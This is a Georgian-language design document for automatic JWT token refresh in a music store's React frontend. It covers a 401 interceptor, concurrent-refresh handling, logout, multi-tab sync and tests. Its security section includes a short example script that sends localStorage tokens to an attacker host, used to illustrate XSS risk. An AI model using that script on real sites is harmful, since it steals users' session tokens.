# Token Refresh იმპლემენტაცია

> "მომხმარებელმა არ უნდა იცოდეს რომ token-ი არსებობს. ყველაფერი ავტომატურად უნდა მოხდეს."

---

## პრობლემის აღწერა

### რატომ გვჭირდება Token Refresh?

**სცენარი: Checkout-ის დროს გაირთვება**

```
═══════════════════════════════════════════════════════════════════════════════
                    UX პრობლემა: Session Expiration
═══════════════════════════════════════════════════════════════════════════════

    მომხმარებელი                                          აპლიკაცია
         │                                                     │
         │  შემოდის 9:00-ზე, ათვალიერებს საიტს               │
         │  30 წუთი ირჩევს beats-ებს                          │
         │  დაამატებს 5 პროდუქტს კალათაში                    │
         │                                                     │
         │  10:05 - Checkout ღილაკზე დაჭერა ────────────────►│
         │                                                     │
         │                                      ┌──────────────┤
         │                                      │ Access Token │
         │                                      │ expired!     │
         │                                      │ (60 წუთის    │
         │                                      │  შემდეგ)     │
         │                                      └──────────────┤
         │                                                     │
         │◄────────────────────────────────────────────────────│
         │  "Please sign in again"                             │
         │                                                     │
         │  😤 კალათა დაკარგა?!                               │
         │  😤 თავიდან უნდა შევიდე?!                          │
         │  😤 წავიდა კონკურენტის საიტზე...                   │
         │                                                     │

    ❌ დაკარგული გაყიდვა = დაკარგული შემოსავალი
    ❌ ცუდი UX = ცუდი რეპუტაცია
═══════════════════════════════════════════════════════════════════════════════
```

### რაში მდგომარეობს პრობლემა?

| Token ტიპი | ვადა | დანიშნულება |
|------------|------|-------------|
| Access Token | 60 წუთი | ყოველი API request-ისთვის |
| Refresh Token | 7 დღე | ახალი Access Token-ის მისაღებად |

**პრობლემა:** Access Token იწურება 60 წუთში, მაგრამ Refresh Token-ს (7 დღე) არ ვიყენებთ ავტომატურად.

---

## მიმდინარე მდგომარეობა

### რა გვაქვს ახლა?

**1. `client.ts` - Refresh Token მეთოდი არსებობს**

```typescript
// C:\Apps\music-store\czaba-store\app\services\api\client.ts

async refreshToken(refreshToken: string): Promise<AuthResponse> {
  return this.request<AuthResponse>('/api/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refreshToken }),
  });
}
```

**2. `auth.ts` - RefreshToken ინახება User ობიექტში**

```typescript
// C:\Apps\music-store\czaba-store\app\lib\auth.ts

function authResponseToUser(response: AuthResponse, registrationSource: RegistrationSource): User {
  return {
    // ...
    accessToken: response.accessToken,
    refreshToken: response.refreshToken,        // <-- ინახება
    accessTokenExpires: response.accessTokenExpires,  // <-- ვადაც
    // ...
  };
}
```

**3. `AuthContext.tsx` - localStorage-ში ინახება**

```typescript
// C:\Apps\music-store\czaba-store\app\contexts\AuthContext.tsx

localStorage.setItem('auth_user', JSON.stringify(userData));
// userData შეიცავს refreshToken-ს
```

### რა აკლია?

```
═══════════════════════════════════════════════════════════════════════════════
                    მიმდინარე Flow (არასრული)
═══════════════════════════════════════════════════════════════════════════════

    Client                                              Server
       │                                                   │
       │  Request + Expired Access Token ─────────────────►│
       │                                                   │
       │◄──────────────────────────────────────────────────│
       │  401 Unauthorized                                 │
       │                                                   │
       │  ❌ აპი არ ცდილობს refresh-ს!                    │
       │  ❌ მომხმარებელს redirect-ს აკეთებს login-ზე      │
       │                                                   │

═══════════════════════════════════════════════════════════════════════════════
                    სასურველი Flow (auto-refresh)
═══════════════════════════════════════════════════════════════════════════════

    Client                                              Server
       │                                                   │
       │  Request + Expired Access Token ─────────────────►│
       │◄──────────────────────────────────────────────────│
       │  401 Unauthorized                                 │
       │                                                   │
       │  ✅ Interceptor catches 401                       │
       │                                                   │
       │  POST /api/auth/refresh ─────────────────────────►│
       │  { refreshToken: "..." }                          │
       │◄──────────────────────────────────────────────────│
       │  { accessToken: NEW, refreshToken: NEW }          │
       │                                                   │
       │  ✅ Save new tokens                               │
       │  ✅ Retry original request ──────────────────────►│
       │◄──────────────────────────────────────────────────│
       │  Success!                                         │
       │                                                   │
       │  მომხმარებელმა ვერც კი შეამჩნია!                 │
       │                                                   │
═══════════════════════════════════════════════════════════════════════════════
```

---

## იმპლემენტაციის გეგმა

### 1. `auth.ts` - refreshAccessToken() ფუნქცია

```typescript
// C:\Apps\music-store\czaba-store\app\lib\auth.ts

// ===========================================
// TOKEN REFRESH
// ===========================================

export async function refreshAccessToken(): Promise<User | null> {
  try {
    // 1. მიიღე შენახული user მონაცემები
    const storedUser = localStorage.getItem('auth_user');
    if (!storedUser) {
      return null;
    }

    const parsedUser = JSON.parse(storedUser);
    const refreshToken = parsedUser.refreshToken;

    if (!refreshToken) {
      console.warn('No refresh token available');
      return null;
    }

    // 2. გაგზავნე refresh request
    const response = await apiClient.refreshToken(refreshToken);

    // 3. შექმენი ახალი user ობიექტი
    const updatedUser: User = {
      ...parsedUser,
      accessToken: response.accessToken,
      refreshToken: response.refreshToken,
      accessTokenExpires: response.accessTokenExpires,
    };

    // 4. შეინახე ახალი tokens
    localStorage.setItem('auth_user', JSON.stringify(updatedUser));

    // 5. განაახლე apiClient-ის token
    apiClient.setAccessToken(response.accessToken);

    return updatedUser;
  } catch (error) {
    console.error('Token refresh failed:', error);

    // Refresh failed - გაწმინდე ყველაფერი
    localStorage.removeItem('auth_user');
    apiClient.setAccessToken(undefined);

    return null;
  }
}

// შემოწმება: token მალე იწურება?
export function isTokenExpiringSoon(expiresAt: string, bufferMinutes = 5): boolean {
  const expiryTime = new Date(expiresAt).getTime();
  const now = Date.now();
  const bufferMs = bufferMinutes * 60 * 1000;

  return expiryTime - now < bufferMs;
}
```

### 2. `client.ts` - Interceptor 401-ზე Auto-Refresh

```typescript
// C:\Apps\music-store\czaba-store\app\services\api\client.ts

class ApiClient {
  private baseUrl: string;
  private accessToken?: string;
  private isRefreshing = false;
  private refreshSubscribers: Array<(token: string) => void> = [];

  // ... არსებული კოდი ...

  // Subscriber pattern - concurrent requests-ისთვის
  private subscribeTokenRefresh(callback: (token: string) => void) {
    this.refreshSubscribers.push(callback);
  }

  private onTokenRefreshed(newToken: string) {
    this.refreshSubscribers.forEach(callback => callback(newToken));
    this.refreshSubscribers = [];
  }

  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<T> {
    const headers: HeadersInit = {
      'Content-Type': 'application/json',
      ...options.headers,
    };

    if (this.accessToken) {
      (headers as Record<string, string>)['Authorization'] = `Bearer ${this.accessToken}`;
    }

    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      ...options,
      headers,
    });

    // 401 Handling with Auto-Refresh
    if (response.status === 401) {
      // არ გავაკეთოთ refresh /auth/refresh endpoint-ისთვის (infinite loop)
      if (endpoint.includes('/auth/refresh')) {
        throw new Error('Session expired. Please sign in again.');
      }

      // თუ უკვე მიმდინარეობს refresh, დაელოდე
      if (this.isRefreshing) {
        return new Promise((resolve, reject) => {
          this.subscribeTokenRefresh(async (newToken) => {
            try {
              (headers as Record<string, string>)['Authorization'] = `Bearer ${newToken}`;
              const retryResponse = await fetch(`${this.baseUrl}${endpoint}`, {
                ...options,
                headers,
              });

              if (!retryResponse.ok) {
                throw new Error(getHttpErrorMessage(retryResponse.status));
              }

              const result: ApiResponse<T> = await retryResponse.json();
              resolve(result.data);
            } catch (error) {
              reject(error);
            }
          });
        });
      }

      // დაიწყე refresh
      this.isRefreshing = true;

      try {
        const storedUser = localStorage.getItem('auth_user');
        if (!storedUser) {
          throw new Error('No stored session');
        }

        const parsedUser = JSON.parse(storedUser);
        const refreshToken = parsedUser.refreshToken;

        if (!refreshToken) {
          throw new Error('No refresh token');
        }

        // Refresh request
        const refreshResponse = await fetch(`${this.baseUrl}/api/auth/refresh`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ refreshToken }),
        });

        if (!refreshResponse.ok) {
          throw new Error('Refresh failed');
        }

        const refreshResult: ApiResponse<AuthResponse> = await refreshResponse.json();
        const newTokens = refreshResult.data;

        // შეინახე ახალი tokens
        const updatedUser = {
          ...parsedUser,
          accessToken: newTokens.accessToken,
          refreshToken: newTokens.refreshToken,
          accessTokenExpires: newTokens.accessTokenExpires,
        };
        localStorage.setItem('auth_user', JSON.stringify(updatedUser));
        this.setAccessToken(newTokens.accessToken);

        // აცნობე subscribers-ს
        this.onTokenRefreshed(newTokens.accessToken);

        // გაიმეორე ორიგინალი request
        (headers as Record<string, string>)['Authorization'] = `Bearer ${newTokens.accessToken}`;
        const retryResponse = await fetch(`${this.baseUrl}${endpoint}`, {
          ...options,
          headers,
        });

        if (!retryResponse.ok) {
          throw new Error(getHttpErrorMessage(retryResponse.status));
        }

        const result: ApiResponse<T> = await retryResponse.json();
        return result.data;

      } catch (refreshError) {
        // Refresh failed - გაწმინდე session
        localStorage.removeItem('auth_user');
        this.setAccessToken(undefined);

        // Dispatch event for AuthContext
        if (typeof window !== 'undefined') {
          window.dispatchEvent(new CustomEvent('auth:session-expired'));
        }

        throw new Error('Session expired. Please sign in again.');
      } finally {
        this.isRefreshing = false;
      }
    }

    if (!response.ok) {
      const error = await response.json().catch(() => ({}));
      const errorMessage = error.detail || error.message || getHttpErrorMessage(response.status);
      throw new Error(errorMessage);
    }

    const result: ApiResponse<T> = await response.json();

    if (!result.success) {
      throw new Error(result.message || 'API request failed');
    }

    return result.data;
  }

  // ... დანარჩენი მეთოდები ...
}
```

### 3. `AuthContext.tsx` - Session Expired Event Handling

```typescript
// C:\Apps\music-store\czaba-store\app\contexts\AuthContext.tsx

export function AuthProvider({ children }: AuthProviderProps) {
  const [user, setUser] = useState<User | null>(null);
  // ... სხვა state-ები ...

  // Session expired event listener
  useEffect(() => {
    const handleSessionExpired = () => {
      console.log('Session expired, logging out...');
      setUser(null);
      localStorage.removeItem('auth_user');
      apiClient.setAccessToken(undefined);

      // გახსენი login modal
      setModalView('signin');
      setIsModalOpen(true);
    };

    window.addEventListener('auth:session-expired', handleSessionExpired);

    return () => {
      window.removeEventListener('auth:session-expired', handleSessionExpired);
    };
  }, []);

  // Proactive token refresh - შეამოწმე token ვადა პერიოდულად
  useEffect(() => {
    if (!user?.accessTokenExpires) return;

    const checkTokenExpiry = () => {
      const expiryTime = new Date(user.accessTokenExpires).getTime();
      const now = Date.now();
      const fiveMinutes = 5 * 60 * 1000;

      // თუ 5 წუთზე ნაკლები დარჩა, განაახლე proactively
      if (expiryTime - now < fiveMinutes && expiryTime > now) {
        console.log('Token expiring soon, refreshing proactively...');
        refreshAccessToken().then((updatedUser) => {
          if (updatedUser) {
            setUser(updatedUser);
          }
        });
      }
    };

    // შეამოწმე ყოველ წუთში
    const interval = setInterval(checkTokenExpiry, 60 * 1000);

    // პირველი შემოწმება
    checkTokenExpiry();

    return () => clearInterval(interval);
  }, [user?.accessTokenExpires]);

  // ... დანარჩენი კოდი ...
}
```

---

## Edge Cases

### 1. Concurrent Requests (რამდენიმე 401 ერთდროულად)

```
═══════════════════════════════════════════════════════════════════════════════
                    პრობლემა: Multiple Refresh Calls
═══════════════════════════════════════════════════════════════════════════════

    Request 1                Request 2               Request 3
        │                        │                       │
        │  401 ───────────────►  │                       │
        │                        │  401 ─────────────►   │
        │                        │                       │  401 ────►
        │                        │                       │
        ▼                        ▼                       ▼
    refresh()                refresh()               refresh()
        │                        │                       │
        │  RT1 ──►               │  RT1 ──►              │  RT1 ──►
        │  ◄── RT2               │                       │
        │                        │  ◄── ERROR!           │
        │                        │  (RT1 revoked)        │  ◄── ERROR!
        │                        │                       │

    ❌ Backend-ზე Token Rotation - RT1 გაუქმდა RT2-ით
    ❌ მეორე და მესამე refresh ვერ მოხერხდა
═══════════════════════════════════════════════════════════════════════════════
```

**გადაწყვეტა: Subscriber Pattern**

```typescript
// ჩვენს იმპლემენტაციაში უკვე გათვალისწინებულია:

private isRefreshing = false;
private refreshSubscribers: Array<(token: string) => void> = [];

// თუ refresh უკვე მიმდინარეობს, დაელოდე შედეგს
if (this.isRefreshing) {
  return new Promise((resolve, reject) => {
    this.subscribeTokenRefresh(async (newToken) => {
      // გამოიყენე ახალი token
    });
  });
}
```

```
═══════════════════════════════════════════════════════════════════════════════
                    გადაწყვეტა: Single Refresh + Subscribers
═══════════════════════════════════════════════════════════════════════════════

    Request 1                Request 2               Request 3
        │                        │                       │
        │  401                   │  401                  │  401
        │                        │                       │
        ▼                        │                       │
    isRefreshing = true          │                       │
        │                        ▼                       ▼
        │                    subscribe()            subscribe()
        │                        │                       │
    refresh() ────────────────► │ ◄──────────────────────│
        │                        │                       │
        ▼                        │                       │
    RT2 received                 │                       │
        │                        │                       │
    onTokenRefreshed(RT2)        │                       │
        │                        │                       │
        ├───────────────────────►│                       │
        │                        ├──────────────────────►│
        │                        │                       │
        ▼                        ▼                       ▼
    retry with RT2           retry with RT2         retry with RT2
        │                        │                       │
    ✅ Success               ✅ Success              ✅ Success

═══════════════════════════════════════════════════════════════════════════════
```

### 2. Refresh Token-იც Expired

```typescript
// Refresh Token ვადა: 7 დღე
// თუ მომხმარებელი 7+ დღე არ იყო, refresh ვერ მოხდება

try {
  const refreshResponse = await fetch(`${this.baseUrl}/api/auth/refresh`, {
    method: 'POST',
    body: JSON.stringify({ refreshToken }),
  });

  if (!refreshResponse.ok) {
    // Backend აბრუნებს 401 თუ refresh token expired
    throw new Error('Refresh failed');
  }
} catch (refreshError) {
  // ❌ Refresh failed

  // 1. გაწმინდე ყველა შენახული მონაცემი
  localStorage.removeItem('auth_user');
  this.setAccessToken(undefined);

  // 2. აცნობე AuthContext-ს
  window.dispatchEvent(new CustomEvent('auth:session-expired'));

  // 3. მომხმარებელს აჩვენე შეტყობინება
  throw new Error('Your session has expired. Please sign in again.');
}
```

```
═══════════════════════════════════════════════════════════════════════════════
                    Refresh Token Expired Flow
═══════════════════════════════════════════════════════════════════════════════

    Client                         Server                        UI
       │                              │                           │
       │  API request ───────────────►│                           │
       │◄─────────────────────────────│                           │
       │  401 Unauthorized            │                           │
       │                              │                           │
       │  refresh attempt ───────────►│                           │
       │◄─────────────────────────────│                           │
       │  401 (RT expired)            │                           │
       │                              │                           │
       │  Clear localStorage          │                           │
       │  Clear accessToken           │                           │
       │                              │                           │
       │  dispatch 'session-expired'  │                           │
       │──────────────────────────────────────────────────────────►│
       │                              │                           │
       │                              │                    Show Login
       │                              │                    Modal
       │                              │                           │
       │                              │           "თქვენი სესია   │
       │                              │            ამოიწურა"      │
       │                              │                           │
═══════════════════════════════════════════════════════════════════════════════
```

### 3. Network Error During Refresh

```typescript
// ქსელის პრობლემა refresh-ის დროს

try {
  const refreshResponse = await fetch(`${this.baseUrl}/api/auth/refresh`, {
    method: 'POST',
    body: JSON.stringify({ refreshToken }),
  });
  // ...
} catch (error) {
  // განასხვავე network error და auth error

  if (error instanceof TypeError && error.message.includes('fetch')) {
    // ❌ Network error - არ გაწმინდო session!
    // მომხმარებელს შეიძლება დაბრუნდეს ინტერნეტი
    throw new Error('Network error. Please check your connection and try again.');
  }

  // Auth error - გაწმინდე session
  localStorage.removeItem('auth_user');
  this.setAccessToken(undefined);
  window.dispatchEvent(new CustomEvent('auth:session-expired'));
  throw new Error('Session expired. Please sign in again.');
}
```

**განსხვავებული handling:**

| Error Type | Action | User Message |
|------------|--------|--------------|
| Network Error | არ გაწმინდო session | "Check your connection" |
| 401 from /refresh | გაწმინდე session | "Please sign in again" |
| 500 from /refresh | Retry once, then fail | "Something went wrong" |

---

## Testing

### 1. Manual Testing Scenarios

```
═══════════════════════════════════════════════════════════════════════════════
                    Test Scenarios
═══════════════════════════════════════════════════════════════════════════════

Scenario 1: Normal Token Refresh
─────────────────────────────────────────────────────────────────────────────
1. შედი სისტემაში
2. დაელოდე 60+ წუთს (ან შეცვალე backend-ზე AccessTokenMinutes: 1)
3. გააკეთე API request (მაგ: გახსენი Orders)
4. ✅ უნდა მოხდეს auto-refresh, მომხმარებელმა ვერ უნდა შეამჩნიოს


Scenario 2: Concurrent Requests
─────────────────────────────────────────────────────────────────────────────
1. შედი სისტემაში
2. გააკეთე token expired (backend-ზე შეცვალე AccessTokenMinutes: 0)
3. გახსენი გვერდი რომელიც რამდენიმე API call-ს აკეთებს (მაგ: Dashboard)
4. ✅ ყველა request-მა უნდა მიიღოს ახალი token
5. ✅ Backend-ზე მხოლოდ 1 refresh call უნდა იყოს


Scenario 3: Refresh Token Expired
─────────────────────────────────────────────────────────────────────────────
1. შედი სისტემაში
2. Backend-ზე: UPDATE dbo.RefreshToken SET ExpiresAt = GETUTCDATE()
3. გააკეთე API request
4. ✅ Login modal უნდა გაიხსნას
5. ✅ localStorage უნდა გაიწმინდოს


Scenario 4: Network Error
─────────────────────────────────────────────────────────────────────────────
1. შედი სისტემაში
2. გააკეთე token expired
3. გამორთე ინტერნეტი (DevTools → Network → Offline)
4. გააკეთე API request
5. ✅ "Check your connection" შეტყობინება
6. ✅ Session არ უნდა გაიწმინდოს
7. ჩართე ინტერნეტი
8. ✅ Request უნდა იმუშაოს refresh-ით

═══════════════════════════════════════════════════════════════════════════════
```

### 2. DevTools-ით ტესტირება

```javascript
// Browser Console-ში:

// 1. ნახე მიმდინარე session
JSON.parse(localStorage.getItem('auth_user'));

// 2. სიმულაცია: Access Token expired
const user = JSON.parse(localStorage.getItem('auth_user'));
user.accessTokenExpires = new Date(Date.now() - 1000).toISOString();
localStorage.setItem('auth_user', JSON.stringify(user));

// 3. გააკეთე რაიმე request და შეამოწმე refresh მოხდა თუ არა

// 4. შეამოწმე Network tab-ში:
//    - /api/auth/refresh call უნდა გამოჩნდეს
//    - ორიგინალი request უნდა გაიმეოროს
```

### 3. Unit Tests

```typescript
// __tests__/auth.test.ts

import { refreshAccessToken, isTokenExpiringSoon } from '~/lib/auth';

describe('Token Refresh', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  test('isTokenExpiringSoon returns true when < 5 minutes left', () => {
    const expiresSoon = new Date(Date.now() + 3 * 60 * 1000).toISOString();
    expect(isTokenExpiringSoon(expiresSoon)).toBe(true);
  });

  test('isTokenExpiringSoon returns false when > 5 minutes left', () => {
    const expiresLater = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    expect(isTokenExpiringSoon(expiresLater)).toBe(false);
  });

  test('refreshAccessToken returns null when no stored user', async () => {
    const result = await refreshAccessToken();
    expect(result).toBeNull();
  });

  test('refreshAccessToken returns null when no refresh token', async () => {
    localStorage.setItem('auth_user', JSON.stringify({ accessToken: 'test' }));
    const result = await refreshAccessToken();
    expect(result).toBeNull();
  });
});
```

### 4. Integration Test

```typescript
// __tests__/integration/token-refresh.test.ts

import { apiClient } from '~/services/api/client';

describe('API Client Token Refresh', () => {
  test('automatically refreshes token on 401', async () => {
    // Setup: expired access token, valid refresh token
    const mockUser = {
      accessToken: 'expired_token',
      refreshToken: 'valid_refresh_token',
      accessTokenExpires: new Date(Date.now() - 1000).toISOString(),
    };
    localStorage.setItem('auth_user', JSON.stringify(mockUser));
    apiClient.setAccessToken('expired_token');

    // Mock fetch
    const fetchSpy = jest.spyOn(global, 'fetch')
      .mockImplementationOnce(() =>
        Promise.resolve(new Response(null, { status: 401 })))
      .mockImplementationOnce(() =>
        Promise.resolve(new Response(JSON.stringify({
          success: true,
          data: {
            accessToken: 'new_access_token',
            refreshToken: 'new_refresh_token',
            accessTokenExpires: new Date(Date.now() + 3600000).toISOString(),
          }
        }))))
      .mockImplementationOnce(() =>
        Promise.resolve(new Response(JSON.stringify({
          success: true,
          data: { /* profile data */ }
        }))));

    // Execute
    await apiClient.getProfile();

    // Assert
    expect(fetchSpy).toHaveBeenCalledTimes(3); // original + refresh + retry

    const storedUser = JSON.parse(localStorage.getItem('auth_user')!);
    expect(storedUser.accessToken).toBe('new_access_token');
  });
});
```

---

## ფაილების რეფერენსი

```
czaba-store/
├── app/
│   ├── contexts/
│   │   └── AuthContext.tsx          # Session expired event handling
│   │                                  # Proactive token refresh
│   │
│   ├── lib/
│   │   └── auth.ts                   # refreshAccessToken()
│   │                                  # isTokenExpiringSoon()
│   │
│   └── services/
│       └── api/
│           └── client.ts             # 401 interceptor
│                                      # Subscriber pattern for concurrent requests
│
└── docs/
    └── technical/
        └── token-refresh.md          # ეს დოკუმენტაცია
```

---

## Logout Handling

### Backend-ზე Refresh Token Revocation

Logout-ის დროს მნიშვნელოვანია backend-ზე refresh token-ის გაუქმება, რომ თუ ვინმემ მოიპარა token, ვერ გამოიყენოს.

**API Endpoint:** `POST /api/auth/logout`

```typescript
// C:\Apps\music-store\czaba-store\app\lib\auth.ts

async function logout() {
  await apiClient.logout();  // revoke refresh token
  localStorage.removeItem('auth_user');
  apiClient.setAccessToken(undefined);
}
```

**რა ხდება backend-ზე:**
1. მიიღება refresh token header-იდან ან body-დან
2. მონაცემთა ბაზაში token-ს ენიშნება `Revoked = true` ან იშლება
3. თუ token-ით ცდიან refresh-ს, backend აბრუნებს 401

**Full Implementation:**

```typescript
// AuthContext.tsx-ში

const logout = useCallback(async () => {
  try {
    // 1. Backend-ზე revoke refresh token
    if (user?.refreshToken) {
      await apiClient.logout();
    }
  } catch (error) {
    // თუ backend call წარუმატებელია, მაინც გავწმინდოთ local state
    console.warn('Logout API call failed:', error);
  } finally {
    // 2. გაწმინდე localStorage
    localStorage.removeItem('auth_user');

    // 3. გაწმინდე apiClient-ის token
    apiClient.setAccessToken(undefined);

    // 4. განაახლე state
    setUser(null);
  }
}, [user]);
```

---

## Multi-Tab Synchronization

### პრობლემა

როცა მომხმარებელს რამდენიმე tab აქვს გახსნილი და ერთში logout გააკეთა, სხვა tab-ებში ისევ logged-in ჩანს - ეს უსაფრთხოების და UX პრობლემაა.

```
═══════════════════════════════════════════════════════════════════════════════
                    Multi-Tab Sync Problem
═══════════════════════════════════════════════════════════════════════════════

    Tab 1                      Tab 2                      Tab 3
      │                          │                          │
      │  Logout ──────►          │                          │
      │  localStorage cleared    │                          │
      │  UI: Login page          │                          │
      │                          │                          │
      │                          │  ❌ Still shows          │  ❌ Still shows
      │                          │     logged in            │     logged in
      │                          │                          │
      │                          │  User clicks             │
      │                          │  "My Orders" ───────────►│
      │                          │  ❌ 401 Error            │
      │                          │                          │

═══════════════════════════════════════════════════════════════════════════════
```

### გადაწყვეტა: Storage Event Listener

`localStorage`-ზე ცვლილებისას browser ავტომატურად გზავნის `storage` event-ს სხვა tab-ებში:

```typescript
// C:\Apps\music-store\czaba-store\app\contexts\AuthContext.tsx

useEffect(() => {
  const handleStorageChange = (event: StorageEvent) => {
    if (event.key === 'auth_user') {
      if (event.newValue === null) {
        // Logout მოხდა სხვა tab-ში
        setUser(null);
      } else {
        // Token განახლდა სხვა tab-ში
        setUser(JSON.parse(event.newValue));
        apiClient.setAccessToken(JSON.parse(event.newValue).accessToken);
      }
    }
  };
  window.addEventListener('storage', handleStorageChange);
  return () => window.removeEventListener('storage', handleStorageChange);
}, []);
```

```
═══════════════════════════════════════════════════════════════════════════════
                    Multi-Tab Sync Solution
═══════════════════════════════════════════════════════════════════════════════

    Tab 1                      Tab 2                      Tab 3
      │                          │                          │
      │  Logout ──────►          │                          │
      │  localStorage cleared    │                          │
      │                          │                          │
      │  storage event ─────────►│                          │
      │                 ─────────────────────────────────────►
      │                          │                          │
      │  UI: Login page          │  ✅ UI: Login page       │  ✅ UI: Login page
      │                          │     (auto-synced)        │     (auto-synced)
      │                          │                          │

═══════════════════════════════════════════════════════════════════════════════
```

### Token განახლების სინქრონიზაცია

როცა ერთ tab-ში token refresh მოხდა, სხვა tab-ებმაც მიიღონ ახალი token:

```typescript
// client.ts - refresh-ის შემდეგ
localStorage.setItem('auth_user', JSON.stringify(updatedUser));
// ეს ავტომატურად გაუგზავნის storage event-ს სხვა tab-ებს
```

---

## Security Considerations

### Token Storage Options

| Storage | XSS Risk | CSRF Risk | აღწერა |
|---------|----------|-----------|--------|
| localStorage | მაღალი | დაბალი | JavaScript-ს აქვს სრული წვდომა |
| httpOnly cookie | დაბალი | საჭიროებს CSRF protection | JS ვერ წაიკითხავს cookie-ს |
| sessionStorage | მაღალი | დაბალი | მხოლოდ ერთი tab, იკარგება დახურვისას |

### ჩვენი არჩევანი: localStorage

**რატომ localStorage?**
- მარტივია SPA-სთვის (Single Page Application)
- Token header-ში იგზავნება, არა cookie-ში
- Multi-tab სინქრონიზაცია მარტივია

**XSS რისკი:**
თუ საიტზე XSS vulnerability არის, attacker-ს შეუძლია:
```javascript
// Malicious script
const tokens = localStorage.getItem('auth_user');
fetch('https://attacker.com/steal', { body: tokens });
```

### Production Recommendation: httpOnly Cookie

Production-ში httpOnly cookie უკეთესია:

```typescript
// Backend-ზე: refresh token httpOnly cookie-ში
res.cookie('refreshToken', token, {
  httpOnly: true,      // JavaScript ვერ წაიკითხავს
  secure: true,        // მხოლოდ HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 დღე
});
```

```typescript
// Frontend-ზე: credentials ჩართვა
fetch('/api/auth/refresh', {
  method: 'POST',
  credentials: 'include',  // cookie-ს გაგზავნა
});
```

### XSS Prevention Best Practices

| Practice | აღწერა |
|----------|--------|
| Content Security Policy | არ დაუშვა inline scripts |
| Input Sanitization | ყველა user input sanitize |
| Output Encoding | HTML entities encode |
| React Auto-Escaping | JSX ავტომატურად ასუფთავებს |

---

## Local Testing Setup

### Access Token ვადის შემცირება

ტესტირებისთვის შეგიძლია Access Token-ის ვადა შეამციროთ 1 წუთამდე:

```json
// appsettings.Development.json
{
  "JwtSettings": {
    "AccessTokenMinutes": 1
  }
}
```

### სრული ტესტ კონფიგურაცია

```json
// appsettings.Development.json
{
  "JwtSettings": {
    "SecretKey": "your-256-bit-secret-key-for-development-only",
    "Issuer": "czaba-api",
    "Audience": "czaba-store",
    "AccessTokenMinutes": 1,           // 1 წუთი ტესტისთვის (default: 60)
    "RefreshTokenDays": 7
  }
}
```

### ტესტირების ნაბიჯები

1. **შეცვალე backend კონფიგურაცია**
   ```bash
   # Czaba.Api/appsettings.Development.json
   "AccessTokenMinutes": 1
   ```

2. **გადატვირთე API**
   ```bash
   cd C:\Apps\Czaba
   dotnet run --project Czaba.Api
   ```

3. **შედი სისტემაში და დაელოდე 1 წუთს**

4. **გააკეთე რაიმე action (მაგ: გახსენი Orders)**

5. **შეამოწმე DevTools Network tab-ში:**
   - ჯერ ხდება 401 response
   - შემდეგ `/api/auth/refresh` call
   - შემდეგ original request retry
   - საბოლოო შედეგი: Success

### DevTools Console Commands

```javascript
// ნახე მიმდინარე token info
const user = JSON.parse(localStorage.getItem('auth_user'));
console.log('Token expires:', new Date(user.accessTokenExpires));
console.log('Time left:', Math.round((new Date(user.accessTokenExpires) - Date.now()) / 1000), 'seconds');

// Force token expiry (testing)
user.accessTokenExpires = new Date(Date.now() - 1000).toISOString();
localStorage.setItem('auth_user', JSON.stringify(user));
console.log('Token manually expired. Next API call will trigger refresh.');
```

---

## Summary

```
═══════════════════════════════════════════════════════════════════════════════
                    TOKEN REFRESH CHECKLIST
═══════════════════════════════════════════════════════════════════════════════

✅ auth.ts:
   ├─ refreshAccessToken() - ფუნქცია refresh-ისთვის
   └─ isTokenExpiringSoon() - შემოწმება ვადის

✅ client.ts:
   ├─ 401 interceptor - ავტომატური refresh
   ├─ Subscriber pattern - concurrent requests
   ├─ Network error handling
   └─ session-expired event dispatch

✅ AuthContext.tsx:
   ├─ session-expired event listener
   ├─ Proactive refresh (5 წუთით ადრე)
   └─ Login modal გახსნა expiry-ზე

✅ Edge Cases:
   ├─ Multiple 401s - single refresh
   ├─ Refresh token expired - redirect to login
   └─ Network error - keep session, show error

═══════════════════════════════════════════════════════════════════════════════
```

---

*"Token Refresh არის უხილავი guardian - მომხმარებელმა არ უნდა იცოდეს რომ მუშაობს, მაგრამ ყოველთვის იქ უნდა იყოს."*
